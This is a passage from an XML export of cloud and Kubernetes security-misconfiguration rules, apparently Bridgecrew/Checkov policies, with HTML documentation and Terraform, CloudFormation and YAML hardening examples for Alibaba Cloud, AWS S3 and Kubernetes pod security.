      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-number' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_9</key>
    <name>Ensure Alibaba Cloud database instance is not public</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-database-instance-is-public"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-database-instance-is-public"></div>Alibaba Cloud database instance is public</div><a aria-label="Skip link to Alibaba Cloud database instance is public" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-database-instance-is-public"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<p>No 0.0.0.0 in security_ips</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_db_instance" "pass" {
  engine              = "MySQL"
  engine_version      = "5.6"
  db_instance_class   = "rds.mysql.t1.small"
  db_instance_storage = "10"
  security_ips = [
    "10.23.12.24"
  ]
  parameters = [{
    name  = "innodb_large_prefix"
    value = "ON"
    }, {
    name  = "connect_timeout"
    value = "50"
  }]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-database-instance-is-not-public' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-database-instance-is-not-public</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-database-instance-is-not-public' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_6</key>
    <name>Ensure Alibaba Cloud OSS bucket is encrypted with Customer Master Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-oss-bucket-is-not-encrypted-with-customer-master-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-oss-bucket-is-not-encrypted-with-customer-master-key"></div>Alibaba Cloud OSS bucket is not encrypted with Customer Master Key</div><a aria-label="Skip link to Alibaba Cloud OSS bucket is not encrypted with Customer Master Key" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-oss-bucket-is-not-encrypted-with-customer-master-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_oss_bucket" "pass" {
  bucket = "bucket-123"
  acl    = "private"

  server_side_encryption_rule {
    sse_algorithm     = "KMS"
    kms_master_key_id = "your kms key id"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-is-encrypted-with-customer-master-key' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-is-encrypted-with-customer-master-key</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-is-encrypted-with-customer-master-key' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_8</key>
    <name>Ensure Alibaba Cloud Disk is encrypted with Customer Master Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-disk-is-not-encrypted-with-customer-master-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-disk-is-not-encrypted-with-customer-master-key"></div>Alibaba Cloud Disk is not encrypted with Customer Master Key</div><a aria-label="Skip link to Alibaba Cloud Disk is not encrypted with Customer Master Key" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-disk-is-not-encrypted-with-customer-master-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_disk" "pass" {
  # cn-beijing
  description = "Hello ecs disk."
  category    = "cloud_efficiency"
  size        = "30"
  encrypted   = true
  kms_key_id  = "2a6767f0-a16c-1234-5678-13bf*****"
  tags = {
    Name = "TerraformTest"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-disk-is-encrypted-with-customer-master-key' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-disk-is-encrypted-with-customer-master-key</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-disk-is-encrypted-with-customer-master-key' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_26</key>
    <name>Ensure Alibaba Cloud Kubernetes installs plugin Terway or Flannel to support standard policies</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-kubernetes-does-not-install-plugin-terway-or-flannel-to-support-standard-policies"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-kubernetes-does-not-install-plugin-terway-or-flannel-to-support-standard-policies"></div>Alibaba Cloud Kubernetes does not install plugin Terway or Flannel to support standard policies</div><a aria-label="Skip link to Alibaba Cloud Kubernetes does not install plugin Terway or Flannel to support standard policies" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-kubernetes-does-not-install-plugin-terway-or-flannel-to-support-standard-policies"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_cs_kubernetes" "pass" {
  worker_number         = 4
  worker_vswitch_ids    = ["vsw-id1", "vsw-id1", "vsw-id3"]
  master_vswitch_ids    = ["vsw-id1", "vsw-id1", "vsw-id3"]
  master_instance_types = ["ecs.n4.small", "ecs.sn1ne.xlarge", "ecs.n4.xlarge"]
  worker_instance_types = ["ecs.n4.small", "ecs.sn1ne.xlarge", "ecs.n4.xlarge"]

  addons {
    config = ""
    name   = "terway-eniip"
  }

  pod_vswitch_ids = ["vsw-id4"]
}

# array of addons
resource "alicloud_cs_kubernetes" "pass2" {
  worker_number         = 4
  worker_vswitch_ids    = ["vsw-id1", "vsw-id1", "vsw-id3"]
  master_vswitch_ids    = ["vsw-id1", "vsw-id1", "vsw-id3"]
  master_instance_types = ["ecs.n4.small", "ecs.sn1ne.xlarge", "ecs.n4.xlarge"]
  worker_instance_types = ["ecs.n4.small", "ecs.sn1ne.xlarge", "ecs.n4.xlarge"]

  addons {
    config = ""
    name   = "flannel"
  }

  addons {
    name   = "csi-plugin"
    config = ""
  }

  pod_cidr = "10.0.1.0/16"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-kubernetes-installs-plugin-terway-or-flannel-to-support-standard-policies' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-kubernetes-installs-plugin-terway-or-flannel-to-support-standard-policies</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-kubernetes-installs-plugin-terway-or-flannel-to-support-standard-policies' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_11</key>
    <name>Ensure Alibaba Cloud OSS bucket has Transfer Acceleration disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-oss-bucket-has-transfer-acceleration-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-oss-bucket-has-transfer-acceleration-disabled"></div>Alibaba Cloud OSS bucket has Transfer Acceleration disabled</div><a aria-label="Skip link to Alibaba Cloud OSS bucket has Transfer Acceleration disabled" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-oss-bucket-has-transfer-acceleration-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_oss_bucket" "pass" {
  bucket = "bucket_name"

  transfer_acceleration {
    enabled = true
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-has-transfer-acceleration-disabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-has-transfer-acceleration-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-has-transfer-acceleration-disabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_20</key>
    <name>Ensure bucket ACL does not grant READ permission to everyone</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="bucket-acl-grants-read-permission-to-everyone"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-bucket-acl-grants-read-permission-to-everyone"></div>Bucket ACL grants READ permission to everyone</div><a aria-label="Skip link to Bucket ACL grants READ permission to everyone" class="heading-anchor-icon fa fa-anchor" href="#bucket-acl-grants-read-permission-to-everyone"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Unprotected S3 buckets are one of the major causes of data theft and intrusions. An S3 bucket that allows <strong>READ</strong> access to everyone can provide attackers the ability to read object data within the bucket, which can lead to the exposure of sensitive data. The only S3 buckets that should be globally accessible for unauthenticated users or for <strong>Any AWS Authenticate Users</strong> are those used for hosting static websites. Bucket ACL helps manage access to S3 bucket data. </p>
<p>We recommend AWS S3 buckets are not publicly accessible for <strong>READ</strong> actions to protect S3 data from unauthorized users and exposing sensitive data to public access. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="procedure"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-procedure"></div>Procedure</div><a aria-label="Skip link to Procedure" class="heading-anchor-icon fa fa-anchor" href="#procedure"></a></h2>
<p>S3 buckets should be protected by using the bucket ACL and bucket policies. If you want to share data with other users via S3 buckets create pre-signed URLs with a short expiration duration. </p>
<p>To generate a pre-signed URL for the file <em>samplefile.zip</em>, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws s3 presign --expires-in 36000 s3://sharedfolder/samplefile.zip
</code></pre>
<p>To generate pre-signed URLS for every object in an S3 bucket, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">while read line; do aws s3 presign --expires-in 36000 s3://sharedfolder/$line; done
</code></pre>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>For all automation-related work use the bucket policy and grant access to the required roles.</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_s3_bucket.data</li>
<li><strong>Argument</strong>: acl</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Terraform</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="Terraform">resource "aws_s3_bucket" "data" {
    ...
  bucket        = "${local.resource_prefix.value}-data"
-  acl           = "public-read"
+  acl           = "private"
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::S3::Bucket.data</li>
<li><strong>Argument</strong>: Properties.AccessControl</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::S3::Bucket
    Properties:
        ...
-     AccessControl: PublicReadWrite / PublicRead
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/s3_1-acl-read-permissions-everyone' target='_blank'> https://docs.bridgecrew.io/docs/s3_1-acl-read-permissions-everyone</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/s3_1-acl-read-permissions-everyone' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_1</key>
    <name>Do not admit containers wishing to share host process ID namespace</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="containers-wishing-to-share-host-process-id-namespace-admitted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-containers-wishing-to-share-host-process-id-namespace-admitted"></div>Containers wishing to share host process ID namespace admitted</div><a aria-label="Skip link to Containers wishing to share host process ID namespace admitted" class="heading-anchor-icon fa fa-anchor" href="#containers-wishing-to-share-host-process-id-namespace-admitted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When process namespace sharing is enabled, processes in a container are visible to all other containers in that pod. This feature can enable configuring cooperating containers that do not include debugging tools, such as a logger sidecar container or troubleshooting container images.</p>
<p>Sharing the host process ID namespace breaks the isolation between container images and can make processes visible to other containers in the pod. This includes all information in the <strong>/proc</strong> directory, which can sometimes include passwords or keys, passed as environment variables.</p>
<p>We recommend you do not admit containers wishing to share the host process ID namespace.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: PodSecurityPolicy</li>
<li><strong>Argument</strong>: hostPID (Optional)<br/>
When set to false, Pod are unable to use their host's PID namespace.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: &lt;policy name&gt;
spec:
+ hostPID: false
</code></pre></div></div>
<p>To use a <strong>PodSecurityPolicy</strong> resource the requesting user or target pod&#8217;s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use <strong>RBAC</strong>, a standard Kubernetes authorization mode.</p>
<p>A <strong>Role</strong> or <strong>ClusterRole</strong> must grant access to <strong>use</strong> the desired policies. </p>
<p><strong>Kind</strong>: ClusterRole</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: &lt;role name&gt;
rules:
- apiGroups: ['policy']
  resources: ['podsecuritypolicies']
  verbs:     ['use']
  resourceNames:
  - &lt;policy name&gt;
</code></pre></div></div>
<p>The <strong>ClusterRole</strong> is then bound to the authorized service(s):</p>
<p><strong>Kind</strong>: ClusterRoleBinding</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: &lt;binding name&gt;
roleRef:
  kind: ClusterRole
  name: &lt;role name&gt;
  apiGroup: rbac.authorization.k8s.io
subjects:
- kind: ServiceAccount
  name: &lt;authorized service account name&gt;
  namespace: &lt;authorized pod namespace&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_17</key>
    <name>Ensure Alibaba Cloud RAM password policy requires at least one lowercase letter</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-ram-password-policy-does-not-have-a-lowercase-character"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-ram-password-policy-does-not-have-a-lowercase-character"></div>Alibaba Cloud RAM password policy does not have a lowercase character</div><a aria-label="Skip link to Alibaba Cloud RAM password policy does not have a lowercase character" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-ram-password-policy-does-not-have-a-lowercase-character"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Alibaba Cloud accounts that do not have a lowercase character in the password policy. As a security best practice, configure a strong password policy for secure access to the Alibaba Cloud console.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-portal"></div>Alibaba Cloud Portal</div><a aria-label="Skip link to Alibaba Cloud Portal" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-portal"></a></h2>
<ol>
<li>Log in to Alibaba Cloud Portal</li>
<li>Go to Resource Access Management (RAM) service</li>
<li>In the left-side navigation pane, click on 'Settings'</li>
<li>In the 'Security Settings' tab, In the 'Password Strength Settings' Section, Click on 'Edit Password Rule'</li>
<li>In the 'Required Elements in Password' field, select 'Lowercase Letters'</li>
<li>Click on 'OK'</li>
<li>Click on 'Close'</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_ram_account_password_policy" "pass" {
  minimum_password_length      = 14
  require_lowercase_characters = true
  require_uppercase_characters = false
  require_numbers              = false
  require_symbols              = false
  hard_expiry                  = true
  max_password_age             = 14
  password_reuse_prevention    = 5
  max_login_attempts           = 3
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-lowercase-letter' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-lowercase-letter</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-lowercase-letter' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_23</key>
    <name>Ensure Alibaba Cloud RAM Account maximal login attempts is less than 5</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-ram-password-policy-maximal-login-attempts-is-more-than-4"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-ram-password-policy-maximal-login-attempts-is-more-than-4"></div>Alibaba Cloud RAM password policy maximal login attempts is more than 4.</div><a aria-label="Skip link to Alibaba Cloud RAM password policy maximal login attempts is more than 4." class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-ram-password-policy-maximal-login-attempts-is-more-than-4"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime---terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime-terraform"></div>Fix - Buildtime - Terraform</div><a aria-label="Skip link to Fix - Buildtime - Terraform" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime---terraform"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "alicloud_ram_account_password_policy" "pass" {
  minimum_password_length      = 9
  require_lowercase_characters = false
  require_uppercase_characters = false
  require_numbers              = false
  require_symbols              = false
  hard_expiry                  = true
  max_password_age             = 12
  password_reuse_prevention    = 5
  max_login_attempts           = 3
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-account-maximal-login-attempts-is-less-than-5' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-account-maximal-login-attempts-is-less-than-5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-account-maximal-login-attempts-is-less-than-5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_10</key>
    <name>Ensure Alibaba Cloud OSS bucket has versioning enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-oss-bucket-has-versioning-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-oss-bucket-has-versioning-disabled"></div>Alibaba Cloud OSS bucket has versioning disabled</div><a aria-label="Skip link to Alibaba Cloud OSS bucket has versioning disabled" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-oss-bucket-has-versioning-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
